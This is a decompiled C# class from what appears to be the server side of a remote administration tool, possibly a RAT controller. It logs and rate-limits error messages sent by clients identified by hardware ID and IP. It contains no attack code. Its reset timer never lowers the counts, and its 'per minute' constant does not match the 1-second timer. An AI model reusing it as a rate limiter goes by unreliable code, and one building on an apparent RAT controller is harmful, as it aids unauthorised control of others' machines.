using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Drawing;
using System.Threading;
using Server.Connectings;
using Server.Helper;

namespace Server.Messages
{
    // Token: 0x02000014 RID: 20
    internal class HandlerError
    {
        // Token: 0x060000EF RID: 239 RVA: 0x00014A80 File Offset: 0x00012C80
        static HandlerError()
        {
            new Timer(delegate (object e)
            {
                foreach (KeyValuePair<string, int> entry in HandlerError.clientErrorCounts.ToArray())
                {
                    HandlerError.clientErrorCounts.AddOrUpdate(entry.Key, 0, (string key, int count) => Math.Max(0, count));
                    if (HandlerError.clientErrorCounts[entry.Key] <= 0)
                    {
                        int num;
                        HandlerError.clientErrorCounts.TryRemove(entry.Key, out num);
                    }
                }
            }, null, TimeSpan.FromSeconds(1.0), TimeSpan.FromSeconds(1.0));
        }

        // Token: 0x060000F0 RID: 240 RVA: 0x00014AC0 File Offset: 0x00012CC0
        public static void Read(Clients client, object[] objects)
        {
            string clientHwid = client.Hwid;
            HandlerError.clientErrorCounts.AddOrUpdate(clientHwid, 1, (string key, int count) => count + 1);
            if (HandlerError.clientErrorCounts[clientHwid] > 50)
            {
                Methods.AppendLogs(client.IP, string.Concat(new string[]
                {
                    "Ignoring excessive error messages from ",
                    client.IP,
                    " (",
                    clientHwid,
                    "). Rate limit exceeded."
                }), Color.Orange);
                return;
            }
            string errorMessage = (string)objects[1];
            if (errorMessage.Length > 500)
            {
                errorMessage = errorMessage.Substring(0, 500) + "...";
            }
            Console.WriteLine("Error: " + errorMessage);
            Methods.AppendLogs(client.IP, "Error: " + errorMessage, Color.Red);
        }

        // Token: 0x04000136 RID: 310
        private static ConcurrentDictionary<string, int> clientErrorCounts = new ConcurrentDictionary<string, int>();

        // Token: 0x04000137 RID: 311
        private const int MAX_ERRORS_PER_CLIENT_PER_MINUTE = 50;
    }
}
